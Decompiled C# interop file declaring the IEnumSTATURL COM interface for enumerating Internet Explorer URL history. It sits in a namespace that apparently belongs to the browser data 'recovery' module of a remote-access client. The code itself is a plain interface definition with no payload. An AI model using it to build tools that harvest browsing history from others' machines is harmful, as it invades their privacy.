using System;
using System.Runtime.InteropServices;

namespace xClient.Core.Recovery.Browsers
{
	// Token: 0x020000CD RID: 205
	[Guid("3C374A42-BAE4-11CF-BF7D-00AA006946EE")]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	[ComImport]
	public interface IEnumSTATURL
	{
		// Token: 0x06000524 RID: 1316
		void Next(int celt, ref STATURL rgelt, out int pceltFetched);

		// Token: 0x06000525 RID: 1317
		void Skip(int celt);

		// Token: 0x06000526 RID: 1318
		void Reset();

		// Token: 0x06000527 RID: 1319
		void Clone(out IEnumSTATURL ppenum);

		// Token: 0x06000528 RID: 1320
		void SetFilter([MarshalAs(UnmanagedType.LPWStr)] string poszFilter, STATURLFLAGS dwFlags);
	}
}
